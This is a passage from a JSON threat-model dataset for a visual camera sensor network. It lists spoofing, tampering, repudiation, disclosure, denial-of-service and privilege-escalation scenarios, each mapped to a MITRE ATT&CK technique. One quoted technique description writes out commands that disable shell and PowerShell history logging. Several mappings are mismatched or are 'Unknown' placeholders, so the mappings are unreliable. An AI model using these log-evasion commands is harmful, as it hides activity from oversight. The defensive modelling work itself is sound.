            "Scenario": "An intruder uses a malicious device to imitate legitimate network components within the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks robust device authentication mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Absence of device authentication policies."
                },
                {
                    "Assumption": "An attacker has physical access to the network environment.",
                    "Role": "Attacker",
                    "Condition": "Insufficient physical security measures are in place."
                },
                {
                    "Assumption": "No active monitoring of network traffic for suspicious behavior.",
                    "Role": "System Administrator",
                    "Condition": "Lack of IDS/IPS solutions."
                }
            ],
            "Potential Impact": "Unauthorized network access, possibility of data interception or relay attacks.",
            "MITRE ATT&CK Keywords": [
                "malicious device",
                "device impersonation",
                "network compromise"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to camera nodes and modifies the firmware.",
            "Assumptions": [
                {
                    "Assumption": "Firmware lacks integrity checks.",
                    "Role": "System Designer",
                    "Condition": "No cryptographic integrity verification implemented."
                },
                {
                    "Assumption": "No proper access control to the device settings.",
                    "Role": "System Administrator",
                    "Condition": "Weak device access protection."
                },
                {
                    "Assumption": "Physical access to the camera nodes is not well-secured.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient physical device security."
                }
            ],
            "Potential Impact": "Firmware corruption, unauthorized functionalities added to the device.",
            "MITRE ATT&CK Keywords": [
                "firmware modification",
                "device manipulation",
                "hardware tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious actors edit visual data files stored in the system.",
            "Assumptions": [
                {
                    "Assumption": "Weak file permissions allow unauthorized access.",
                    "Role": "System Administrator",
                    "Condition": "Improper configuration of file access controls."
                },
                {
                    "Assumption": "Lack of encryption for stored data.",
                    "Role": "System Designer",
                    "Condition": "Data storage not secured with encryption."
                },
                {
                    "Assumption": "No logging or monitoring of file access and modifications.",
                    "Role": "System Administrator",
                    "Condition": "Lack of audit logs or monitoring solutions."
                }
            ],
            "Potential Impact": "Corruption of visual data, leading to potential false interpretations and decisions.",
            "MITRE ATT&CK Keywords": [
                "file tampering",
                "data integrity violation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a vulnerability to modify the configuration of the VSN.",
            "Assumptions": [
                {
                    "Assumption": "The vulnerability exists within the system software.",
                    "Role": "Developer",
                    "Condition": "Unpatched software or known vulnerabilities."
                },
                {
                    "Assumption": "The attacker has knowledge of existing vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Information publicly available or obtained through reconnaissance."
                },
                {
                    "Assumption": "No security patch management in place.",
                    "Role": "System Administrator",
                    "Condition": "Missing regular patch updates and security reviews."
                }
            ],
            "Potential Impact": "Alteration of system behavior, leading to downtimes or incorrect operations.",
            "MITRE ATT&CK Keywords": [
                "configuration modification",
                "software vulnerabilities",
                "exploit"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An unauthorized user performs actions on the VSN but denies doing so.",
            "Assumptions": [
                {
                    "Assumption": "Lack of proper logging of user actions.",
                    "Role": "System Administrator",
                    "Condition": "No audit logs available."
                },
                {
                    "Assumption": "Session activity is not tracked or recorded.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient session tracking mechanisms."
                },
                {
                    "Assumption": "No strong authentication mechanisms in place.",
                    "Role": "System Administrator",
                    "Condition": "Weak authentication processes."
                }
            ],
            "Potential Impact": "Difficulty in tracing actions back to the perpetrator, potential legal and compliance issues.",
            "MITRE ATT&CK Keywords": [
                "untracked actions",
                "no logging",
                "denial of actions"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker modifies system logs to erase traces of tampering activities.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are insecure.",
                    "Role": "System Designer",
                    "Condition": "Logs not tamper-proof."
                },
                {
                    "Assumption": "An attacker has sufficient privileges to access and edit system logs.",
                    "Role": "Attacker",
                    "Condition": "Elevated privileges obtained."
                },
                {
                    "Assumption": "No backup logging is in place.",
                    "Role": "System Administrator",
                    "Condition": "Logs not redundantly stored."
                }
            ],
            "Potential Impact": "Loss of forensic evidence, making it challenging to investigate and respond to incidents.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "audit log tampering",
                "forensic evasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Disputed changes in VSN configuration settings with no traceable accountability.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not logged.",
                    "Role": "System Administrator",
                    "Condition": "Logging of configuration changes is not enabled."
                },
                {
                    "Assumption": "Multiple users share administrative credentials.",
                    "Role": "System Administrator",
                    "Condition": "Shared administrative accounts are used."
                },
                {
                    "Assumption": "No version control of configuration settings.",
                    "Role": "System Designer",
                    "Condition": "Absence of a configuration management system."
                }
            ],
            "Potential Impact": "Misconfigurations cannot be traced back to the responsible party, leading to potential security and operational issues.",
            "MITRE ATT&CK Keywords": [
                "no accountability",
                "config change dispute",
                "lack of traceability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to visual data captured by the VSN through network interception.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption protocols for data in transit."
                },
                {
                    "Assumption": "Weak network access control measures.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate segmentation and firewall policies."
                },
                {
                    "Assumption": "No intruder detection systems in place.",
                    "Role": "System Administrator",
                    "Condition": "Absence of network monitoring for anomalous activities."
                }
            ],
            "Potential Impact": "Exposure of sensitive visual data, risking privacy and security concerns.",
            "MITRE ATT&CK Keywords": [
                "data leakage",
                "network interception",
                "sniffing"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker accesses visual data files stored without proper access controls.",
            "Assumptions": [
                {
                    "Assumption": "Files do not have appropriate encryption.",
                    "Role": "System Designer",
                    "Condition": "Data at rest is not encrypted."
                },
                {
                    "Assumption": "Insufficient or improper file permission settings.",
                    "Role": "System Administrator",
                    "Condition": "Weak file access controls."
                },
                {
                    "Assumption": "Access control logs are not maintained or monitored.",
                    "Role": "System Administrator",
                    "Condition": "Logging and monitoring deficient."
                }
            ],
            "Potential Impact": "Critical visual data could be exfiltrated, leading to security and privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "file access",
                "inadequate permissions",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data logs from the VSN are accessed by unauthorized users.",
            "Assumptions": [
                {
                    "Assumption": "Logs contain sensitive information and are not secured.",
                    "Role": "System Designer",
                    "Condition": "Logs not encrypted or stored securely."
                },
                {
                    "Assumption": "Lack of access controls for log files.",
                    "Role": "System Administrator",
                    "Condition": "Logs accessible without proper authentication."
                },
                {
                    "Assumption": "No monitoring on who accesses the logs.",
                    "Role": "System Administrator",
                    "Condition": "Monitoring of logs access is not implemented."
                }
            ],
            "Potential Impact": "Sensitive data exposure, leading to potential exploitation or regulatory non-compliance.",
            "MITRE ATT&CK Keywords": [
                "data logs",
                "log file access",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on the VSN network infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "The network is not adequately protected against high traffic volumes.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient DDoS mitigation measures."
                },
                {
                    "Assumption": "Critical systems are connected without redundancy.",
                    "Role": "System Designer",
                    "Condition": "No failover or load-balancing mechanisms."
                },
                {
                    "Assumption": "No active monitoring to detect unusual traffic patterns.",
                    "Role": "System Administrator",
                    "Condition": "Lack of real-time monitoring solutions."
                }
            ],
            "Potential Impact": "Network saturation leading to disruption of visual data transmission and processing.",
            "MITRE ATT&CK Keywords": [
                "network flooding",
                "resource exhaustion",
                "traffic overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability to crash the VSN application.",
            "Assumptions": [
                {
                    "Assumption": "The system has unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Missing patches or updates."
                },
                {
                    "Assumption": "The attacker can identify system vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of unpatched system flaws."
                },
                {
                    "Assumption": "No application-layer defense mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Absence of safeguards against exploitation at the application layer."
                }
            ],
            "Potential Impact": "Service disruption, preventing functionality of the VSN.",
            "MITRE ATT&CK Keywords": [
                "application crash",
                "vulnerability exploit",
                "service outage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Resource exhaustion attack by continuously triggering VSN processing tasks.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks rate-limiting mechanisms.",
                    "Role": "System Designer",
                    "Condition": "No limits on task invocation."
                },
                {
                    "Assumption": "Processing resources are not adequately protected.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient resource management."
                },
                {
                    "Assumption": "No monitoring of resource consumption patterns.",
                    "Role": "System Administrator",
                    "Condition": "Lack of resource usage monitoring."
                }
            ],
            "Potential Impact": "Depletion of processing capacity leading to degradation or halt of services.",
            "MITRE ATT&CK Keywords": [
                "resource consumption",
                "continuous triggering",
                "processing overload"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a known Linux vulnerability to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "The system has unpatched Linux vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Outdated system patches."
                },
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Ability to communicate with the vulnerable machine."
                },
                {
                    "Assumption": "The OS does not have additional security layers like SELinux.",
                    "Role": "System Designer",
                    "Condition": "Lack of advanced OS-level security controls."
                }
            ],
            "Potential Impact": "Full system compromise with root privileges, leading to unauthorized control over all system functions.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "root access",
                "Linux exploit"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting a misconfigured service running with high privileges.",
            "Assumptions": [
                {
                    "Assumption": "Service configurations are not securely defined.",
                    "Role": "System Administrator",
                    "Condition": "Misconfiguration of service privileges."
                },
                {
                    "Assumption": "The attacker knows or can discover the service configurations.",
                    "Role": "Attacker",
                    "Condition": "Access to configuration details or knowledge."
                },
                {
                    "Assumption": "No regular security audits of services.",
                    "Role": "System Administrator",
                    "Condition": "Absence of security audits."
                }
            ],
            "Potential Impact": "Elevated access allowing unauthorized actions and system modifications.",
            "MITRE ATT&CK Keywords": [
                "misconfiguration",
                "service abuse",
                "privilege manipulation"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of deserialization vulnerabilities to execute arbitrary code.",
            "Assumptions": [
                {
                    "Assumption": "Deserialization of untrusted data is not secure.",
                    "Role": "System Designer",
                    "Condition": "Use of insecure deserialization processes."
                },
                {
                    "Assumption": "The attacker can inject malicious serialized objects.",
                    "Role": "Attacker",
                    "Condition": "Ability to send crafted payloads."
                },
                {
                    "Assumption": "No code execution restrictions are in place.",
                    "Role": "System Administrator",
                    "Condition": "No safeguards against arbitrary code execution."
                }
            ],
            "Potential Impact": "Execution of arbitrary code with elevated privileges, leading to potential full system compromise.",
            "MITRE ATT&CK Keywords": [
                "code execution",
                "serialization exploit",
                "deserialization vulnerability"
            ],
            "mitre_technique": {
                "name": "Exploitation for Client Execution",
                "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
                "technique_id": "T1203"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "15",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor creates counterfeit camera nodes to join the Visual Sensor Network (VSN).",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network to intercept communications.",
                    "Role": "Attacker",
                    "Condition": "Valid if the VSN is inadequately secured."
                },
                {
                    "Assumption": "The network lacks strong authentication mechanisms for node verification.",
                    "Role": "System Administrator",
                    "Condition": "Valid if no robust authentication is implemented."
                },
                {
                    "Assumption": "The attacker has sufficient technical skill to replicate a network node.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker is technically proficient."
                }
            ],
            "Potential Impact": "Unauthorized access to visual data, leading to potential breaches of confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Man-in-the-middle (MitM) attack to capture and alter the communication between camera nodes and the server.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic between nodes and server is not encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Valid if encryption is not implemented."
                },
                {
                    "Assumption": "The attacker can intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid if network is not properly secured."
                },
                {
                    "Assumption": "The attacker has tools to manipulate network packets.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has access to necessary tools."
                }
            ],
            "Potential Impact": "Compromise of data integrity and confidentiality through alteration and exposure of visual data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "MitM",
                "network",
                "packet manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
